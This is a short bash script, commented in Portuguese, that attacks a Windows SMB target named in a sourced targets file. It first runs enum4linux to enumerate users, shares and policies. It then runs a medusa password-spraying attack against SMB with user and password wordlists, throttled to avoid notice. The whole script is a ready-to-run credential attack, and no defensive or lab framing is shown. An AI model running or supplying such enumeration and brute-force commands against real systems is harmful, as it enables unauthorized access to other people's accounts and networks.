#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/../data/targets.env"
OUT=./data/out
mkdir -p "$OUT/raw"
# Enumeração (usuarios, shares, políticas)
enum4linux -a "$TARGET_SMB" | tee "$OUT/raw/enum4linux.txt"
# Spraying controlado (threads e backoff para simular prudência)
medusa -h "$TARGET_SMB" \
-U data/wordlists/users.txt \
-P data/wordlists/pass.txt \
-M smbnt -t 2 -T 6 -O "$OUT/raw/medusa_smb.txt"
